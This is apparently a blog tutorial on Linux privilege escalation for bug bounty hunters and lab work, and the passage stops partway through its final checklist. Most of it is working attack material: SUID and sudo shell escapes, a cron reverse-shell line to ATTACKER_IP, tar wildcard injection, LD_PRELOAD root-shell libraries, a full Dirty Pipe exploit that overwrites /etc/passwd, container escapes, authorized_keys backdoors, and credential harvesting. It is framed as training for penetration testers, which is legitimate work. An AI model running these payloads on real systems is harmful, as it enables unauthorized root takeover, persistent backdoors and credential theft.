---
title: "Linux Privilege Escalation Basics for Bug Bounty Hunters and Lab Environments"
meta_description: "Complete guide to Linux privilege escalation -- SUID exploitation, sudo abuse, cron job hijacking, Docker group escape, kernel exploits, PATH hijacking, and full methodology with real payloads for penetration testers and bug bounty hunters."
slug: "linux-privilege-escalation-basics-bug-bounty-labs"
keywords: ["Linux privilege escalation", "SUID exploitation", "GTFOBins", "sudo privilege escalation", "cron job hijacking", "PATH hijacking", "Docker group exploit", "kernel exploit", "dirty pipe", "dirty cow", "LinPEAS", "privilege escalation checklist", "bug bounty Linux", "penetration testing Linux", "NFS no_root_squash", "capability abuse"]
series: "Security Deep Dive"
part: 13
---

# Linux Privilege Escalation Basics for Bug Bounty Hunters and Lab Environments

## Introduction

You have a low-privilege shell. Now what?

Privilege escalation is the bridge between initial access and full system compromise. In bug bounty, demonstrating that an RCE vulnerability leads to root access transforms a high-severity finding into a critical one. In penetration testing, privesc is the difference between a limited foothold and complete domain compromise. In CTFs and lab environments, it is the core skill being tested.

This guide is a technical, payload-heavy walkthrough of every major Linux privilege escalation vector. Every technique includes the exact commands to enumerate, the conditions required, and the exploitation steps. This is written for practitioners who already have a working knowledge of Linux, shell commands, and basic security concepts.

We start from a shell as a low-privilege user and systematically work toward root.

---

## 1. SUID Binary Exploitation

### What is SUID?

When the SUID (Set User ID) bit is set on an executable, it runs with the permissions of the file owner, not the user executing it. If root owns a SUID binary, anyone who runs it executes code as root.

### Enumeration

```bash
# Find all SUID binaries on the system
find / -perm -4000 -type f 2>/dev/null

# Find SUID binaries owned by root specifically
find / -perm -4000 -user root -type f 2>/dev/null

# Compare against a known-good baseline
# Standard SUID binaries: passwd, ping, su, sudo, mount, umount
# Anything else is worth investigating
```

### Exploiting Common SUID Binaries

Every binary listed below has been documented on GTFOBins. Here are the direct exploitation commands.

**find**

```bash
# If /usr/bin/find has SUID bit set
find . -exec /bin/sh -p \; -quit

# The -p flag preserves the effective UID (root)
# You now have a root shell
```

**vim / vi**

```bash
# If vim has SUID
vim -c ':!/bin/sh'

# Or
vim -c ':py3 import os; os.execl("/bin/sh", "sh", "-p")'
```

**python / python3**

```bash
# If python has SUID
python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# Or using setuid explicitly
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

**nmap (older versions with interactive mode)**

```bash
# nmap versions 2.02 to 5.21 had interactive mode
nmap --interactive
!sh

# Modern nmap with SUID -- write to files as root
# Create a script nmap will execute
TF=$(mktemp)
echo 'os.execute("/bin/sh")' > $TF
nmap --script=$TF
```

**bash**

```bash
# If /bin/bash has SUID (rare but happens in CTFs)
bash -p
# -p prevents bash from dropping privileges
```

**cp**

```bash
# If cp has SUID, overwrite /etc/passwd or /etc/shadow
# First, generate a password hash
openssl passwd -1 -salt abc password123
# Output: $1$abc$wPbMoLPMJD6oLd1H0mLIa/

# Create a modified passwd entry
echo 'root2:$1$abc$wPbMoLPMJD6oLd1H0mLIa/:0:0:root:/root:/bin/bash' >> /tmp/passwd_mod

# Copy the original passwd and append your user
cp /etc/passwd /tmp/passwd_orig
cat /tmp/passwd_orig /tmp/passwd_mod > /tmp/passwd_new
cp /tmp/passwd_new /etc/passwd

# Login as your new root user
su root2
# Password: password123
```

**env**

```bash
# If env has SUID
env /bin/sh -p
```

**less / more**

```bash
# If less has SUID, open any file then escape to shell
less /etc/shadow
!/bin/sh
```

**awk**

```bash
# If awk has SUID
awk 'BEGIN {system("/bin/sh")}'
```

### GTFOBins Reference and Methodology

GTFOBins (https://gtfobins.github.io/) is the canonical reference. The methodology is:

1. Run `find / -perm -4000 -type f 2>/dev/null`
2. For each non-standard binary, search GTFOBins
3. Check the "SUID" section for that binary
4. Execute the provided command
5. Verify escalation with `id` and `whoami`

```bash
# Quick check script
echo "=== SUID Binaries ==="
find / -perm -4000 -type f 2>/dev/null | while read binary; do
  basename "$binary"
done | sort -u

echo ""
echo "=== Check these against GTFOBins ==="
echo "https://gtfobins.github.io/"
```

---

## 2. Writable Cron Jobs

### Enumeration

```bash
# View system-wide cron jobs
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/

# View user cron jobs (may be restricted)
crontab -l
cat /var/spool/cron/crontabs/* 2>/dev/null

# Check if any cron scripts are writable by your user
find /etc/cron* -writable -type f 2>/dev/null
find /var/spool/cron -writable -type f 2>/dev/null

# Watch for processes that appear periodically (cron detection)
# Run pspy or manually monitor
# pspy is a process monitoring tool that does not require root
./pspy64
```

### Exploiting Writable Cron Scripts

If a cron job runs a script as root and you can write to that script:

```bash
# Example: /etc/crontab contains
# * * * * * root /opt/scripts/backup.sh

# Check permissions
ls -la /opt/scripts/backup.sh
# -rwxrwxrwx 1 root root 245 Jan 1 00:00 /opt/scripts/backup.sh
# World-writable -- exploitable

# Option 1: Reverse shell
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /opt/scripts/backup.sh

# Option 2: SUID bash
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /opt/scripts/backup.sh
# Wait for cron to fire, then:
/tmp/rootbash -p

# Option 3: Add your SSH key
echo 'echo "YOUR_SSH_PUBLIC_KEY" >> /root/.ssh/authorized_keys' >> /opt/scripts/backup.sh

# Option 4: Modify /etc/passwd
echo 'echo "hacker:\$1\$abc\$wPbMoLPMJD6oLd1H0mLIa/:0:0:root:/root:/bin/bash" >> /etc/passwd' >> /opt/scripts/backup.sh
```

### PATH Abuse in Cron

If a cron script calls a command without an absolute path:

```bash
# Example cron script /opt/scripts/cleanup.sh:
# #!/bin/bash
# cd /tmp
# tar czf /backup/tmp_backup.tar.gz *

# If the cron job's PATH includes a writable directory before /usr/bin
# Check /etc/crontab for the PATH variable:
# PATH=/home/user/bin:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Create a malicious "tar" in the writable PATH directory
echo '#!/bin/bash' > /home/user/bin/tar
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /home/user/bin/tar
chmod +x /home/user/bin/tar

# When cron runs cleanup.sh, it will find our malicious tar first
# Wait for execution, then:
/tmp/rootbash -p
```

### Wildcard Injection in Cron

This is a classic technique when a cron job uses wildcards with `tar`, `rsync`, or `chown`:

```bash
# If cron runs: tar czf /backup/archive.tar.gz /data/*
# The wildcard expands filenames, which tar interprets as flags

cd /data

# Create checkpoint files that tar interprets as options
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh privesc.sh"

# Create the payload
echo '#!/bin/bash' > privesc.sh
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> privesc.sh
chmod +x privesc.sh

# When tar runs with the wildcard, it sees:
# tar czf /backup/archive.tar.gz --checkpoint=1 --checkpoint-action=exec=sh privesc.sh other_files...
# This executes privesc.sh as root
```

---

## 3. Sudo Abuse

### Enumeration

```bash
# The single most important command after getting a shell
sudo -l

# Example output:
# User www-data may run the following commands on target:
#     (ALL) NOPASSWD: /usr/bin/vim
#     (ALL) NOPASSWD: /usr/bin/python3
#     (ALL : ALL) NOPASSWD: /usr/bin/env
#     (root) NOPASSWD: /opt/scripts/restart.sh
```

### Exploiting Sudo Permissions

For every binary in `sudo -l`, check GTFOBins under the "Sudo" section.

**vim**

```bash
sudo vim -c ':!/bin/bash'
```

**python3**

```bash
sudo python3 -c 'import os; os.system("/bin/bash")'
```

**env**

```bash
sudo env /bin/bash
```

**less**

```bash
sudo less /etc/shadow
!/bin/bash
```

**awk**

```bash
sudo awk 'BEGIN {system("/bin/bash")}'
```

**find**

```bash
sudo find /tmp -exec /bin/bash \; -quit
```

**perl**

```bash
sudo perl -e 'exec "/bin/bash";'
```

**ruby**

```bash
sudo ruby -e 'exec "/bin/bash"'
```

**man**

```bash
sudo man man
!/bin/bash
```

**nmap**

```bash
# Create a script for nmap to execute
TF=$(mktemp)
echo 'os.execute("/bin/bash")' > $TF
sudo nmap --script=$TF
```

**apache2 / nginx (reading files)**

```bash
# Cannot get a shell but can read files
sudo apache2 -f /etc/shadow
# The error message will dump the file contents
```

**zip**

```bash
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'bash #'
```

**tar**

```bash
sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
```

### NOPASSWD Entries with Wildcards

```bash
# If sudo -l shows:
# (root) NOPASSWD: /opt/scripts/*.sh

# You might be able to traverse
sudo /opt/scripts/../../tmp/evil.sh

# Create evil.sh in /tmp
echo '#!/bin/bash' > /tmp/evil.sh
echo '/bin/bash' >> /tmp/evil.sh
chmod +x /tmp/evil.sh

# Depending on sudo version and configuration, path traversal may work
sudo /opt/scripts/../../../tmp/evil.sh
```

### Sudo Environment Variable Abuse (LD_PRELOAD)

```bash
# If sudo -l shows:
# env_keep += LD_PRELOAD

# Create a shared library that spawns a root shell
cat > /tmp/privesc.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setresuid(0, 0, 0);
    system("/bin/bash -p");
}
EOF

gcc -fPIC -shared -nostartfiles -o /tmp/privesc.so /tmp/privesc.c

# Use it with any allowed sudo command
sudo LD_PRELOAD=/tmp/privesc.so /usr/bin/vim
# Immediate root shell before vim even loads
```

### LD_LIBRARY_PATH Abuse

```bash
# If sudo -l shows:
# env_keep += LD_LIBRARY_PATH

# Find shared libraries used by the allowed binary
ldd /usr/bin/allowed_binary
# Example output: libcustom.so => /usr/lib/libcustom.so

# Create a malicious replacement
cat > /tmp/libcustom.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
    unsetenv("LD_LIBRARY_PATH");
    setresuid(0, 0, 0);
    system("/bin/bash -p");
}
EOF

gcc -o /tmp/libcustom.so -shared -fPIC /tmp/libcustom.c

sudo LD_LIBRARY_PATH=/tmp /usr/bin/allowed_binary
```

---

## 4. Sudo Version Exploits

### CVE-2021-3156 (Baron Samedit)

This is a heap-based buffer overflow in sudo versions before 1.9.5p2. It affects sudo 1.8.2 through 1.8.31p2 and 1.9.0 through 1.9.5p1. It allows any local user to gain root privileges without knowing the user's password.

```bash
# Check sudo version
sudo --version
# Sudo version 1.8.31

# Test if vulnerable (safe test)
sudoedit -s '\' $(python3 -c 'print("A"*1000)')
# If it crashes or shows "malloc(): corrupted top size" -- vulnerable
# If it shows usage message -- patched

# Exploitation (use the public PoC)
git clone https://github.com/blasty/CVE-2021-3156.git
cd CVE-2021-3156
make
./sudo-hax-me-a-sandwich 0
# Try different target numbers (0, 1, 2) for different OS/sudo combos

# Alternative exploit by worawit
git clone https://github.com/worawit/CVE-2021-3156.git
cd CVE-2021-3156
python3 exploit_nss.py
```

### CVE-2019-14287 (Sudo bypass)

```bash
# If sudo -l shows:
# (ALL, !root) NOPASSWD: /bin/bash
# This means you can run bash as any user EXCEPT root

# Bypass using user ID -1 or 4294967295 (both resolve to UID 0)
sudo -u#-1 /bin/bash
# or
sudo -u#4294967295 /bin/bash

# Affected: sudo < 1.8.28
```

### CVE-2023-22809 (Sudoedit bypass)

```bash
# Affected: sudo 1.8.0 to 1.9.12p1
# If you have sudoedit permissions for a specific file,
# you can edit arbitrary files via EDITOR environment variable

# If sudo -l shows:
# (root) NOPASSWD: sudoedit /etc/nginx/sites-available/default

# Exploit: edit /etc/shadow instead
EDITOR="vim -- /etc/shadow" sudoedit /etc/nginx/sites-available/default
# This opens both /etc/shadow and the allowed file in vim
# Modify /etc/shadow to add a root user or remove root's password hash
```

---

## 5. PATH Hijacking

### Relative Path Abuse in Scripts

If a script or binary running as root (via SUID, cron, or sudo) calls a command without its full path, you can hijack it.

```bash
# Example: SUID binary /opt/status calls "service" without full path
strings /opt/status
# Output includes: service apache2 status

# Or use ltrace/strace to confirm
ltrace /opt/status 2>&1 | grep -i system
# system("service apache2 status")

# Hijack by placing a malicious "service" earlier in PATH
echo '#!/bin/bash' > /tmp/service
echo '/bin/bash -p' >> /tmp/service
chmod +x /tmp/service

export PATH=/tmp:$PATH
/opt/status
# Root shell
```

### Shared Library Hijacking

```bash
# If a SUID binary loads a library from a writable location
# Check with strace or ldd
strace /opt/vulnerable_binary 2>&1 | grep "open.*\.so"
ldd /opt/vulnerable_binary

# If it tries to load from a path you control:
# open("/opt/libs/libhelper.so", O_RDONLY) = -1 ENOENT
# And /opt/libs/ is writable:

cat > /tmp/libhelper.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>

static void init() __attribute__((constructor));

void init() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
EOF

gcc -shared -fPIC -o /opt/libs/libhelper.so /tmp/libhelper.c

/opt/vulnerable_binary
# Root shell
```

---

## 6. Exposed Secrets in Environment Variables

```bash
# Check environment variables for credentials
env
printenv
cat /proc/self/environ | tr '\0' '\n'

# Check all processes' environments (requires same user or root)
cat /proc/*/environ 2>/dev/null | tr '\0' '\n' | sort -u

# Common secrets to look for
env | grep -iE 'pass|secret|key|token|api|database|db_|mysql|postgres|mongo|redis|aws|azure|gcp'

# Check .bashrc, .bash_profile, .profile for hardcoded credentials
cat ~/.bashrc
cat ~/.bash_profile
cat ~/.profile
cat /home/*/.bashrc 2>/dev/null

# Check history files
cat ~/.bash_history
cat /home/*/.bash_history 2>/dev/null
cat ~/.mysql_history 2>/dev/null
cat ~/.psql_history 2>/dev/null

# Search for credentials in common config files
find / -name "*.conf" -o -name "*.config" -o -name "*.ini" -o -name "*.env" 2>/dev/null | \
  xargs grep -l -iE 'password|passwd|secret|key' 2>/dev/null
```

### Practical Example: Database Credentials Leading to Root

```bash
# Found in environment:
# DB_PASSWORD=SuperSecret123!
# DB_USER=root
# DB_HOST=localhost

# Connect to MySQL running as root
mysql -u root -p'SuperSecret123!' -e "SELECT @@version; SELECT user();"

# MySQL UDF (User Defined Function) for command execution
# If MySQL runs as root and you have FILE privilege:
mysql -u root -p'SuperSecret123!' << 'SQL'
-- Check plugin directory
SHOW VARIABLES LIKE 'plugin_dir';
-- Usually /usr/lib/mysql/plugin/ or /usr/lib64/mysql/plugin/

-- Create UDF from a compiled .so (lib_mysqludf_sys)
CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_mysqludf_sys.so';
SELECT sys_exec('cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash');
SQL

/tmp/rootbash -p
```

---

## 7. Docker Group Abuse

If your user is in the `docker` group, you effectively have root access. Docker requires root-level kernel access, and any user who can run Docker commands can mount the host filesystem.

### Enumeration

```bash
# Check if current user is in docker group
id
groups
# uid=1000(user) gid=1000(user) groups=1000(user),999(docker)

# Check if docker socket is accessible
ls -la /var/run/docker.sock
# srw-rw---- 1 root docker 0 Apr 2 00:00 /var/run/docker.sock
```

### Exploitation

```bash
# Method 1: Mount host filesystem
docker run -v /:/hostfs -it alpine /bin/sh
# Now in the container with full host filesystem at /hostfs
cat /hostfs/etc/shadow
cat /hostfs/root/.ssh/id_rsa

# Add your SSH key to root
echo "YOUR_SSH_PUBLIC_KEY" >> /hostfs/root/.ssh/authorized_keys

# Or create a SUID bash
cp /hostfs/bin/bash /hostfs/tmp/rootbash
chmod +s /hostfs/tmp/rootbash
exit

# On host:
/tmp/rootbash -p

# Method 2: Use host PID namespace
docker run --rm -it --pid=host --privileged alpine nsenter -t 1 -m -u -i -n -p -- /bin/bash
# This gives you a root shell directly on the host

# Method 3: If no alpine image is available, check existing images
docker images
# Use whatever is available
docker run -v /:/hostfs -it ubuntu /bin/bash
```

### Container Escape from Privileged Containers

```bash
# Check if you are in a container
cat /proc/1/cgroup | grep -i docker
ls /.dockerenv

# Check if privileged
cat /proc/1/status | grep CapEff
# 000001ffffffffff = privileged

# Escape via mounting host disk
fdisk -l  # find host disk
mkdir /tmp/hostfs
mount /dev/sda1 /tmp/hostfs
chroot /tmp/hostfs bash

# Escape via cgroup release_agent (works on older kernels)
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p $d/exploit
echo 1 > $d/exploit/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > $d/release_agent
echo '#!/bin/sh' > /cmd
echo "id > $host_path/output" >> /cmd
chmod +x /cmd
sh -c "echo 0 > $d/exploit/cgroup.procs"
cat /output
```

---

## 8. Misconfigured Services

### MySQL Running as Root

```bash
# Check if MySQL is running as root
ps aux | grep mysql
# If it shows "root" as the user, it is misconfigured

# If you have MySQL credentials (from config files, environment, etc.)
# Use UDF for command execution (covered above in Section 6)

# Or use MySQL to read sensitive files
mysql -u root -p'password' -e "SELECT LOAD_FILE('/etc/shadow');"
mysql -u root -p'password' -e "SELECT LOAD_FILE('/root/.ssh/id_rsa');"
```

### Writable Service Files

```bash
# Find writable systemd service files
find /etc/systemd/system/ -writable -type f 2>/dev/null
find /lib/systemd/system/ -writable -type f 2>/dev/null
find /usr/lib/systemd/system/ -writable -type f 2>/dev/null

# If you find a writable service file that runs as root
# Example: /etc/systemd/system/webapp.service is writable
cat /etc/systemd/system/webapp.service
# [Service]
# ExecStart=/opt/webapp/start.sh
# User=root

# Modify the ExecStart
# Replace with a reverse shell or SUID copy
cat > /etc/systemd/system/webapp.service << 'EOF'
[Unit]
Description=WebApp

[Service]
ExecStart=/bin/bash -c 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash'
User=root

[Install]
WantedBy=multi-user.target
EOF

# Wait for service restart or trigger it if possible
systemctl daemon-reload 2>/dev/null  # may need privileges
# Or wait for a cron job that restarts services

/tmp/rootbash -p
```

### Writable Scripts Called by Services

```bash
# Find scripts referenced by systemd services
grep -r "ExecStart\|ExecStop\|ExecReload" /etc/systemd/system/ 2>/dev/null
grep -r "ExecStart\|ExecStop\|ExecReload" /lib/systemd/system/ 2>/dev/null

# Check if any referenced scripts are writable
# Example: ExecStart=/opt/scripts/start.sh
ls -la /opt/scripts/start.sh
# -rwxrwxrwx 1 root root ...
# World-writable!

echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /opt/scripts/start.sh
# Wait for service restart
```

---

## 9. SSH Key Exposure

### Finding Readable Private Keys

```bash
# Search for SSH keys
find / -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" -o -name "*.pem" 2>/dev/null

# Check permissions
ls -la /home/*/.ssh/ 2>/dev/null
ls -la /root/.ssh/ 2>/dev/null

# Read any accessible keys
cat /home/admin/.ssh/id_rsa 2>/dev/null
cat /root/.ssh/id_rsa 2>/dev/null

# Check for keys in backup directories
find / -name "*.bak" -path "*ssh*" 2>/dev/null
find /tmp /var/tmp /opt /backup -name "*id_rsa*" 2>/dev/null
```

### Authorized Keys Injection

```bash
# If /root/.ssh/ or /root/.ssh/authorized_keys is writable
# Or if /home/privileged_user/.ssh/authorized_keys is writable

# Generate a key pair on your attack machine
ssh-keygen -t ed25519 -f /tmp/privesc_key -N ""

# Add your public key
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIExampleKey attacker@kali" >> /root/.ssh/authorized_keys

# Or if /root/.ssh/ does not exist but /root/ is writable:
mkdir -p /root/.ssh
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIExampleKey attacker@kali" > /root/.ssh/authorized_keys
chmod 700 /root/.ssh
chmod 600 /root/.ssh/authorized_keys

# Connect as root
ssh -i /tmp/privesc_key root@localhost
```

### SSH Agent Hijacking

```bash
# If another user has an SSH agent running and you can read their socket
find /tmp -name "agent.*" -type s 2>/dev/null
# /tmp/ssh-XXXXXX/agent.1234

# Check if accessible
ls -la /tmp/ssh-*/

# If readable, hijack the agent
export SSH_AUTH_SOCK=/tmp/ssh-XXXXXX/agent.1234
ssh-add -l
# Lists keys loaded in the agent

# Use the agent to SSH to other hosts or escalate locally
ssh root@localhost
```

---

## 10. Kernel Exploits

Kernel exploits are the last resort. They can crash the system and should only be used when other methods fail. In CTF and lab environments, they are fair game.

### Enumeration

```bash
# Get kernel version
uname -a
uname -r
cat /proc/version

# Get OS information
cat /etc/os-release
cat /etc/issue
lsb_release -a 2>/dev/null

# Search for exploits
# Use searchsploit on your attack machine
searchsploit linux kernel $(uname -r | cut -d'-' -f1) privilege escalation
```

### Dirty Pipe (CVE-2022-0847)

Affects Linux kernel 5.8 through 5.16.10. Allows overwriting data in arbitrary read-only files.

```bash
# Check if vulnerable
uname -r
# Must be >= 5.8 and < 5.16.11 (or specific patched versions)

# Compile the exploit
cat > /tmp/dirtypipe.c << 'CEOF'
/* Dirty Pipe - CVE-2022-0847 */
/* Simplified PoC - overwrites /etc/passwd to add root user */
#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

static void prepare_pipe(int p[2]) {
    if (pipe(p)) abort();
    const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
    static char buffer[4096];
    unsigned r;
    for (r = pipe_size; r > 0;) {
        unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
        write(p[1], buffer, n);
        r -= n;
    }
    for (r = pipe_size; r > 0;) {
        unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
        read(p[0], buffer, n);
        r -= n;
    }
}

int main(int argc, char **argv) {
    if (argc != 4) {
        fprintf(stderr, "Usage: %s TARGETFILE OFFSET DATA\n", argv[0]);
        return 1;
    }
    const char *const path = argv[1];
    loff_t offset = strtoul(argv[2], NULL, 0);
    const char *const data = argv[3];
    const size_t data_size = strlen(data);

    const int fd = open(path, O_RDONLY);
    if (fd < 0) { perror("open"); return 1; }

    int p[2];
    prepare_pipe(p);

    --offset;
    ssize_t nbytes = splice(fd, &offset, p[1], NULL, 1, 0);
    if (nbytes < 0) { perror("splice"); return 1; }

    nbytes = write(p[1], data, data_size);
    if (nbytes < 0) { perror("write"); return 1; }

    printf("Wrote %zd bytes at offset %lu\n", nbytes, (unsigned long)offset + 1);
    close(fd);
    return 0;
}
CEOF

gcc -o /tmp/dirtypipe /tmp/dirtypipe.c

# Backup and exploit /etc/passwd
# Overwrite root's password hash field
# Original line: root:x:0:0:root:/root:/bin/bash
# We overwrite the 'x' with a known hash

# Generate password hash
HASH=$(openssl passwd -1 -salt pipe password123)

# Write the hash at offset 5 (after "root:")
/tmp/dirtypipe /etc/passwd 5 "$HASH"

# Login as root
su root
# Password: password123
```

### Dirty COW (CVE-2016-5195)

Affects Linux kernels 2.6.22 to 4.8.3. Exploits a race condition in the copy-on-write mechanism.

```bash
# Check kernel version -- must be < 4.8.3 (or specific patched versions)
uname -r

# Compile and run
# There are many variants; the /etc/passwd overwrite is most reliable
# Download from https://github.com/firefart/dirtycow

cat > /tmp/dcow.c << 'CEOF'
// dirtycow /etc/passwd variant (firefart)
// Replaces root password in /etc/passwd
// Full source: https://github.com/firefart/dirtycow/blob/master/dirty.c
// (abbreviated here -- use the full source in practice)
CEOF

# In practice, download the full PoC:
# wget https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c -O /tmp/dcow.c
# gcc -pthread -o /tmp/dcow /tmp/dcow.c -lcrypt
# /tmp/dcow
# Enter new root password when prompted
```

### PwnKit (CVE-2021-4034)

Affects polkit's `pkexec` -- present on almost every Linux distribution. Works on most systems from 2009 to January 2022.

```bash
# Check if pkexec exists and has SUID
ls -la /usr/bin/pkexec
# -rwsr-xr-x 1 root root ... /usr/bin/pkexec

# Check polkit version
pkexec --version
# pkexec version 0.105 (vulnerable)

# Compile and run PoC
# Multiple PoCs available:
# https://github.com/berdav/CVE-2021-4034
# https://github.com/arthepsy/CVE-2021-4034

git clone https://github.com/berdav/CVE-2021-4034.git /tmp/pwnkit
cd /tmp/pwnkit
make
./cve-2021-4034
# Root shell
```

---

## 11. NFS Misconfiguration (no_root_squash)

### Enumeration

```bash
# Check for NFS exports from the target
showmount -e TARGET_IP
# Export list for TARGET_IP:
# /shared   *(rw,no_root_squash)

# The key flag is no_root_squash
# This means that root on the client is treated as root on the NFS share
# (normally, root is "squashed" to the nobody user)

# Also check locally
cat /etc/exports 2>/dev/null
# /shared *(rw,sync,no_root_squash)
```

### Exploitation

On your attack machine (as root):

```bash
# Mount the NFS share
mkdir /tmp/nfs_mount
mount -t nfs TARGET_IP:/shared /tmp/nfs_mount

# Create a SUID binary as root
cat > /tmp/nfs_mount/privesc.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
    return 0;
}
EOF

gcc -o /tmp/nfs_mount/privesc /tmp/nfs_mount/privesc.c
chmod +s /tmp/nfs_mount/privesc

# Or simply copy a SUID bash
cp /bin/bash /tmp/nfs_mount/rootbash
chmod +s /tmp/nfs_mount/rootbash
```

On the target machine:

```bash
# Navigate to the NFS mount
cd /shared
./privesc
# Root shell

# Or
./rootbash -p
```

---

## 12. Linux Capabilities Abuse

Capabilities provide granular root-like permissions. A binary with certain capabilities can perform privileged operations without full root.

### Enumeration

```bash
# Find binaries with capabilities set
getcap -r / 2>/dev/null

# Example output:
# /usr/bin/python3 = cap_setuid+ep
# /usr/bin/perl = cap_setuid+ep
# /usr/bin/tar = cap_dac_read_search+ep
# /usr/bin/openssl = cap_setuid+ep
```

### Exploitation

**cap_setuid (most dangerous)**

```bash
# python3 with cap_setuid
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# perl with cap_setuid
/usr/bin/perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'
```

**cap_dac_read_search (read any file)**

```bash
# tar with cap_dac_read_search
# Read /etc/shadow
tar czf /tmp/shadow.tar.gz /etc/shadow
tar xzf /tmp/shadow.tar.gz -C /tmp/
cat /tmp/etc/shadow

# Read SSH keys
tar czf /tmp/keys.tar.gz /root/.ssh/
tar xzf /tmp/keys.tar.gz -C /tmp/
cat /tmp/root/.ssh/id_rsa
```

**cap_net_raw**

```bash
# Can capture network traffic -- useful for sniffing credentials
# python3 with cap_net_raw
python3 -c "
from scapy.all import *
sniff(filter='tcp port 80', prn=lambda x: x.summary(), count=100)
"
```

**cap_sys_admin**

```bash
# Extremely broad -- can mount filesystems, use ptrace, etc.
# If a container has cap_sys_admin, it can escape
mount -t proc proc /mnt  # mount host's proc
```

---

## 13. Writable /etc/passwd

On older systems or misconfigured machines, `/etc/passwd` may be writable. Modern Linux uses `/etc/shadow` for password hashes, but `/etc/passwd` still supports inline password hashes for backward compatibility.

```bash
# Check permissions
ls -la /etc/passwd
# -rw-rw-rw- 1 root root ... /etc/passwd
# World-writable -- exploitable

# Generate a password hash
openssl passwd -1 -salt xyz password123
# $1$xyz$hR4K.JJRnXz3VnEVnHOD3.

# Method 1: Add a new root user
echo 'hacker:$1$xyz$hR4K.JJRnXz3VnEVnHOD3.:0:0:hacker:/root:/bin/bash' >> /etc/passwd
su hacker
# Password: password123

# Method 2: Replace root's password field
# Change root:x:0:0: to root:$1$xyz$hR4K.JJRnXz3VnEVnHOD3.:0:0:
# Use sed carefully
cp /etc/passwd /tmp/passwd.bak
sed -i 's/root:x:/root:$1$xyz$hR4K.JJRnXz3VnEVnHOD3.:/' /etc/passwd
su root
# Password: password123
```

---

## 14. LinPEAS and LinEnum Usage

### LinPEAS

LinPEAS is the most comprehensive automated privilege escalation scanner for Linux.

```bash
# Transfer to target
# On attacker machine:
python3 -m http.server 8000

# On target:
curl http://ATTACKER_IP:8000/linpeas.sh -o /tmp/linpeas.sh
# Or
wget http://ATTACKER_IP:8000/linpeas.sh -O /tmp/linpeas.sh

chmod +x /tmp/linpeas.sh

# Run it
/tmp/linpeas.sh | tee /tmp/linpeas_output.txt

# Run specific checks only
/tmp/linpeas.sh -s  # superfast (less thorough, less noisy)
/tmp/linpeas.sh -a  # all checks including slow ones

# Key sections to review in output:
# - RED/YELLOW highlighted items are high-priority findings
# - SUID binaries
# - Sudo permissions
# - Writable cron jobs
# - Interesting files with credentials
# - Docker/LXC group membership
# - Capabilities
# - NFS exports
# - Writable PATH directories
```

### LinEnum

```bash
# Transfer and run
curl http://ATTACKER_IP:8000/LinEnum.sh -o /tmp/linenum.sh
chmod +x /tmp/linenum.sh

# Basic run
/tmp/linenum.sh

# Thorough mode (keyword search in files)
/tmp/linenum.sh -t

# Export results
/tmp/linenum.sh -r /tmp/linenum_report -e /tmp/linenum_exports

# Key checks:
# - Kernel and distribution details
# - Super user accounts
# - Sudo config and permissions
# - SUID/GUID files
# - Writable files and directories
# - Cron jobs
# - Running services
# - Network configuration
```

### pspy (Process Spy)

```bash
# pspy monitors processes without root permissions
# Crucial for detecting cron jobs that run as root

# Transfer and run
curl http://ATTACKER_IP:8000/pspy64 -o /tmp/pspy64
chmod +x /tmp/pspy64

/tmp/pspy64

# Watch output for processes spawned by UID=0 (root)
# Look for scripts, binaries, or commands that run periodically
# These are your cron-based privesc targets
```

---

## 15. Privilege Escalation Checklist

Use this systematic checklist every time you get a low-privilege shell:

```bash
# === PHASE 1: SITUATIONAL AWARENESS ===
whoami
id
hostname
uname -a
cat /etc/os-release
cat /proc/version

# === PHASE 2: QUICK WINS ===
sudo -l                                    # sudo permissions
find / -perm -4000 -type f 2>/dev/null     # SUID binaries
getcap -r / 2>/dev/null                    # capabilities
cat /etc/crontab                           # cron jobs
ls -la /etc/cron*                          # cron directories
ls -la /var/run/docker.sock 2>/dev/null    # docker socket
groups                                     # group memberships (docker, lxd, disk, adm)

# === PHASE 3: CREDENTIALS ===
cat ~/.bash_history
cat /home/*/.bash_history 2>/dev/null
env | grep -iE 'pass|secret|key|token'
